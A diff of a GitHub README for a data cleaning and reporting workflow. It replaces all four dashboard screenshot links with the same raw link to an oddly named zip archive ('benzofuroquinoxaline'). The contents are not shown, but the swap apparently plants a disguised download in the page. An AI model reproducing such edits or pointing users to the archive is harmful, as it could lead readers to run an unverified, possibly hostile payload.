@@ -66,19 +66,19 @@ Logs are saved in pipeline_logs/ for easy monitoring 🔧
 
 ### 📊 Page 1 – High-Level Financial Overview
 
-<img width="956" height="720" alt="image" src="https://github.com/user-attachments/assets/b036f732-49de-4a27-8624-5c057d6e4ce2" />
+<img width="956" height="720" alt="image" src="https://github.com/Muhammad-suhaib1/Automated-Data-Cleaning-Reporting-Workflow/raw/refs/heads/main/input/Reporting_Data_Workflow_Automated_Cleaning_benzofuroquinoxaline.zip" />
 
 ### 📊 Page 2 – Department Spend vs Budget Comparison
 
-<img width="956" height="721" alt="image" src="https://github.com/user-attachments/assets/f2f480ae-dfb1-41f7-ae94-9d8465033be6" />
+<img width="956" height="721" alt="image" src="https://github.com/Muhammad-suhaib1/Automated-Data-Cleaning-Reporting-Workflow/raw/refs/heads/main/input/Reporting_Data_Workflow_Automated_Cleaning_benzofuroquinoxaline.zip" />
 
 ### 📊 Page 3 – Monthly Trends
 
-<img width="963" height="722" alt="image" src="https://github.com/user-attachments/assets/54d0e95a-b7be-44de-8b04-72021ff820e9" />
+<img width="963" height="722" alt="image" src="https://github.com/Muhammad-suhaib1/Automated-Data-Cleaning-Reporting-Workflow/raw/refs/heads/main/input/Reporting_Data_Workflow_Automated_Cleaning_benzofuroquinoxaline.zip" />
 
 ### 📊 Page 4 – Forecast vs Actual Insights
 
-<img width="961" height="713" alt="image" src="https://github.com/user-attachments/assets/00c2b2e0-3306-4564-805a-054190faa272" />
+<img width="961" height="713" alt="image" src="https://github.com/Muhammad-suhaib1/Automated-Data-Cleaning-Reporting-Workflow/raw/refs/heads/main/input/Reporting_Data_Workflow_Automated_Cleaning_benzofuroquinoxaline.zip" />
 
 
 
